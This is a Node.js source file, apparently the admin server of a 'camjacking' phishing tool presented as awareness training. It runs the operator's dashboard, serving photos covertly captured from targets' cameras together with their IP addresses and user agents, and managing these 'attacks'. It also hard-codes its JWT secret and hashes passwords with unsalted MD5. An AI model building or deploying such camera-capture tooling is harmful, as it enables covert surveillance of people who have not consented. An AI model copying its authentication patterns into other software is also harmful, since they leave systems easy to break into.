#!/usr/bin/env node
/**
 * Camjacking - Camera Awareness & Security Training Toolkit (CLI)
 * ---------------------------------------------------------------
 *
 * Author      : Karthikeyan (https://karthithehacker.com)
 * GitHub      : https://github.com/karthi-the-hacker/camjacking
 * Project     : camjacking - A CLI framework for camera security awareness, phishing simulation, and cybersecurity training labs.
 *
 * License     : Open-source — strictly for educational, awareness, and authorized security training purposes ONLY.
 *
 * Note to Users:
 * --------------
 * 🔐 This tool is intended solely for educational use, security awareness programs, and authorized red-team / lab environments.
 * 🚫 Unauthorized use of this tool against individuals, devices, or networks without explicit permission is illegal and unethical.
 * ❗ If you use or modify this code, PLEASE GIVE PROPER CREDIT to the original author and repository.
 *
 * Warning to Code Thieves:
 * ------------------------
 * ❌ Removing this header or claiming this project as your own without credit is unethical and violates open-source community principles.
 * 🧠 Writing your own code earns respect. Copy-pasting without attribution does not.
 * ✅ Be an ethical hacker. Respect developers' efforts and give credit where it’s due.
 */



const express = require("express");
const bodyParser = require("body-parser");
const jwt = require("jsonwebtoken");
const md5 = require("md5");
const path = require("path");
const fs = require("fs");
const cors = require("cors");

const {
  getUser,
  setUser,
  getAttacks,
  getAttack,
  deleteAttack,
} = require("./dbgateway");

const JWT_SECRET = "cappriciosec@CAMJACKING"; 
const ATTACKS_DIR = path.join(process.cwd(), "db", "attacks");
let serverInstance = null;
const PHOTOS_DIR = path.join(process.env.HOME || process.env.USERPROFILE, "camjacking-photos");


function startAdminServer(port = 5000) {
  if (serverInstance) {
    //console.log("[!] Admin server already running");
    return serverInstance;
  }

  const app = express();
  app.use("/media", express.static(PHOTOS_DIR));

  app.use(cors());
  app.use(bodyParser.json());
  app.use(bodyParser.urlencoded({ extended: true }));


  function authMiddleware(req, res, next) {
    const token =
      req.headers.authorization?.split(" ")[1] ||
      req.query.token ||
      req.cookies?.token;

    if (!token) return res.redirect("/login");

    try {
      const decoded = jwt.verify(token, JWT_SECRET);
      req.user = decoded;
      next();
    } catch (e) {
      return res.redirect("/login");
    }
  }


  app.use(express.static(path.join(__dirname, "public")));

  app.get("/", (req, res) => {
    const token = req.headers.authorization?.split(" ")[1];

    if (!token) {
      return res.sendFile(path.join(__dirname, "public/login.html"));
    }

    try {
      jwt.verify(token, JWT_SECRET);
      return res.sendFile(path.join(__dirname, "public/dashboard.html"));
    } catch {
      return res.sendFile(path.join(__dirname, "public/login.html"));
    }
  });


  app.post("/login", (req, res) => {
    const { username, password } = req.body;
    const user = getUser();

    if (!user.username || !user.password) {
      return res.status(400).json({ error: "Admin not configured yet" });
    }

    if (username === user.username && md5(password) === user.password) {
      const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: "6h" });
      return res.json({ token });
    }

    res.status(401).json({ error: "Invalid credentials" });
  });


  app.post("/update", authMiddleware, (req, res) => {
    const { username, password, chatid } = req.body;

    const current = getUser();

    setUser({
      username: username || current.username,
      password: password ? md5(password) : current.password,
      chatid: chatid || current.chatid
    });

    res.json({ success: true });
  });


  app.get("/attack/:uuid", authMiddleware, (req, res) => {
    const attack = getAttack(req.params.uuid);
    if (!attack) return res.status(404).json({ error: "Not found" });
    res.json(attack);
  });


  app.get("/fetch", authMiddleware, (req, res) => {
    const attacks = getAttacks().map((atk) => {
      const filePath = path.join(process.cwd(), "db", "attacks", `${atk.uuid}.json`);
      if (!fs.existsSync(filePath)) return atk;
      return JSON.parse(fs.readFileSync(filePath, "utf8"));
    });

    res.json(attacks);
  });

 app.get("/attack/:uuid/pic", authMiddleware, (req, res) => {
  const { uuid } = req.params;

  const attack = getAttack(uuid);
  if (!attack) {
    return res.status(404).json({ error: "Attack not found" });
  }

 
  const images = attack.logs
    .filter(log => log.filename)
    .map(log => {
      const folder = uuid; 
      const filePath = path.join(PHOTOS_DIR, folder, log.filename);

      if (!fs.existsSync(filePath)) return null;

      return {
        filename: log.filename,
        url: `/media/${folder}/${log.filename}`,
        capturedAt: log.at,
        ip: log.ip,
        useragent: log.useragent
      };
    })
    .filter(Boolean);

  res.json({
    uuid,
    count: images.length,
    images
  });
  });

  app.delete("/attack/:uuid/pic/:filename", authMiddleware, (req, res) => {
    const { uuid, filename } = req.params;

    const attack = getAttack(uuid);
    if (!attack) {
      return res.status(404).json({ error: "Attack not found" });
    }
    const folder = uuid; 

    const filePath = path.join(PHOTOS_DIR, folder, filename);
    if (!filePath.startsWith(path.join(PHOTOS_DIR, folder))) {
      return res.status(400).json({ error: "Invalid path" });
    }

    if (!fs.existsSync(filePath)) {
      return res.status(404).json({ error: "File not found" });
    }
    fs.unlinkSync(filePath);
    const data = getAttack(uuid);
    data.logs = data.logs.filter(log => log.filename !== filename);

    fs.writeFileSync(
    path.join(ATTACKS_DIR, `${uuid}.json`),
    JSON.stringify(data, null, 2)
  );

    res.json({ success: true, deleted: filename });
  });

  app.delete("/attack/:uuid", authMiddleware, (req, res) => {
  const { uuid } = req.params;

  const attack = getAttack(uuid);
  if (!attack) {
    return res.status(404).json({ error: "Attack not found" });
  }

  deleteAttack(uuid);

  const photosFolder = path.join(PHOTOS_DIR, uuid);

  if (photosFolder.startsWith(PHOTOS_DIR) && fs.existsSync(photosFolder)) {
    fs.rmSync(photosFolder, { recursive: true, force: true });
  }

  res.json({
    success: true,
    deleted: {
      uuid,
      photosFolder
    }
  });
  });

  app.get("/admin", authMiddleware, (req, res) => {
  const { username, chatid } = getUser();

  res.json({
    username,
    chatid
  });
});

  app.get("/templates/local", (req, res) => {
    try {
      const TEMPLATES_DIR = path.join(process.env.HOME || process.env.USERPROFILE, "camjacking-templates");

      const items = fs.readdirSync(TEMPLATES_DIR, { withFileTypes: true });

      const folders = items
        .filter((item) => item.isDirectory())
        .map((dir) => dir.name);

      res.json({
        success: true,
        count: folders.length,
        templates: folders
      });
    } catch (err) {
      console.error(err);
      res.status(500).json({
        success: false,
        error: "Failed to read templates directory"
      });
    }
  });

  serverInstance = app.listen(port, () => {
    //console.log(`[+] Admin server running on http://localhost:${port}`);
  });

  return serverInstance;
}

// Optional: stop server if needed
function stopAdminServer() {
  if (serverInstance) {
    serverInstance.close(() => {
      console.log("[+] Admin server stopped");
      serverInstance = null;
    });
  }
}

module.exports = {
  startAdminServer,
  stopAdminServer
};
